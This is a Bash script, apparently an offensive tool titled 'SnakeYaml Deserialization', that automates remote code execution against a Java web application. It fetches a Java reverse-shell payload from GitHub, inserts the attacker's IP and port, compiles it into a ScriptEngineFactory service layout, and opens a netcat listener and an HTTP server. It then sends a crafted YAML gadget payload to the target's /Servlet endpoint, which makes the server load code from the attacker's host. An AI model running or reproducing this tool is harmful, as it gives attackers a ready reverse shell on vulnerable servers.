#!/bin/sh

echo -e "\e[1;31m
                                                                                        
  _|_|_|                      _|                _|      _|                          _|  
_|        _|_|_|      _|_|_|  _|  _|      _|_|    _|  _|    _|_|_|  _|_|_|  _|_|    _|  
  _|_|    _|    _|  _|    _|  _|_|      _|_|_|_|    _|    _|    _|  _|    _|    _|  _|  
      _|  _|    _|  _|    _|  _|  _|    _|          _|    _|    _|  _|    _|    _|  _|  
_|_|_|    _|    _|    _|_|_|  _|    _|    _|_|_|    _|      _|_|_|  _|    _|    _|  _|  
                                                                                        
                                                                                        
                                                                                                                    
_|_|_|                                            _|  _|  _|                        _|      _|                      
_|    _|    _|_|      _|_|_|    _|_|    _|  _|_|      _|      _|_|_|_|    _|_|_|  _|_|_|_|        _|_|    _|_|_|    
_|    _|  _|_|_|_|  _|_|      _|_|_|_|  _|_|      _|  _|  _|      _|    _|    _|    _|      _|  _|    _|  _|    _|  
_|    _|  _|            _|_|  _|        _|        _|  _|  _|    _|      _|    _|    _|      _|  _|    _|  _|    _|  
_|_|_|      _|_|_|  _|_|_|      _|_|_|  _|        _|  _|  _|  _|_|_|_|    _|_|_|      _|_|  _|    _|_|    _|    _|  
                                                                                                                    
                                                                                                                     \e[0m"
echo -e "\033[36m  
CHOSE AN ACTION \n 
1 - START SCRIPT\n
2 - EXIT\n "

echo -e "\e[1;31mBY: 0XLINUX\e[0m"

read exploit
case $exploit in 

	1*)
                echo "Create folder of the exploit" 
                echo "enter name it's should be not exist"
                read folder
                echo "type path of the folder of this script" 
                read path
                echo "type target IP OR URL with full path:" 
                echo "without http or https protocol"
                echo "Ex: example.com/yaml OR 198.168.1.129/yaml"
		read URL
		echo "type ur IP:" 
		read IP
                echo "type port for nc:" 
		read PORT
                 
                 mkdir /$path/$folder
                 mkdir /$path/$folder/META-INF
                 mkdir /$path/$folder/META-INF/services
                 mkdir /$path/$folder/Exploit
                 echo "Exploit.Exploit" > /$path/$folder/META-INF/services/javax.script.ScriptEngineFactory
                 sleep 1
                 cd /$path/$folder/Exploit
                 wget https://raw.githubusercontent.com/MazX0p/java-reverse-shell/main/Exploit.java
                 sleep 1
                 echo -ne '#######################   (100%)\r'
                 echo -ne '\n'
                 echo 'Download DONE'
                 echo -ne '\n'
                 perl -pi -e "s/your IP/$IP/g" Exploit.java
                 echo -ne '#####                     (33%)\r'
                 sleep 1
                 echo -ne '#############             (66%)\r'
                 sleep 1
                 echo -ne '#######################   (100%)\r'
                 echo -ne '\n'
                 echo 'Insert IP DONE'
                 echo -ne '\n'
                 perl -pi -e "s/your port/$PORT/g" Exploit.java
                 echo -ne '#####                     (33%)\r'
                 sleep 1
                 echo -ne '#############             (66%)\r'
                 sleep 1
                 echo -ne '#######################   (100%)\r'
                 echo -ne '\n'
                 echo 'Insert PORT Done'
                 echo -ne '\n'
                 javac /$path/$folder/Exploit/Exploit.java
                 echo -ne '#####                     (33%)\r'
                 sleep 2
                 echo -ne '#############             (66%)\r'
                 sleep 5
                 echo -ne '#######################   (100%)\r'
                 echo -ne '\n'
                 echo 'PAYLOAD genrated'
                 echo -ne '\n'
                 gnome-terminal --tab --title="nc" --command="bash -c 'cd /$path/$folder; nc -lvnp $PORT; $SHELL'" 
                 echo -ne '#####                     (33%)\r'
                 sleep 1
                 echo -ne '#############             (66%)\r'
                 sleep 1
                 echo -ne '#######################   (100%)\r'
                 echo -ne '\n'
                 echo 'nc opened'
                 echo -ne '\n'
                 gnome-terminal --tab --title="Python server" --command="bash -c 'cd /$path/$folder; sudo python -m SimpleHTTPServer 80; $SHELL'"
                 echo -ne '#####                     (33%)\r'
                 sleep 2
                 echo -ne '#############             (66%)\r'
                 sleep 5
                 echo -ne '#######################   (100%)\r'
                 echo -ne '\n'
                 echo 'python server opened'
                 echo -ne '\n'
                 cd /$path/$folder
                 curl "http://$URL/Servlet" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Connection: keep-alive' -H 'Cookie: JSESSIONID=70E762822752D3F2CCEA1EF8FAF906CC' -H 'Upgrade-Insecure-Requests: 1' --data-raw "data=%21%21javax.script.ScriptEngineManager+%5B%0D%0A++%21%21java.net.URLClassLoader+%5B%5B%0D%0A++++%21%21java.net.URL+%5B%22http%3A%2F%2F$IP%2F%22%5D%0D%0A++%5D%5D%0D%0A%5D"
                 echo -ne '#######################   (100%)\r'
                 echo -ne '\n'
                 echo 'Exploit DONE'
	;;

	2*)
		echo -e "\e[1;31m
		████    █     █ ██████  
		█   █   █     █ █       
		█    █  █     █ █       
		█    █   █   █  █       
		█    █   █   █  █       
		█   █     █ █   █       
		████      █ █   █████   
		█   █      █    █       
		█    █     █    █       
		█    █     █    █       
		█    █     █    █       
		█   █      █    █       
		████       █    ██████\e[0m"
                   exit 0
	;;
	esac
	
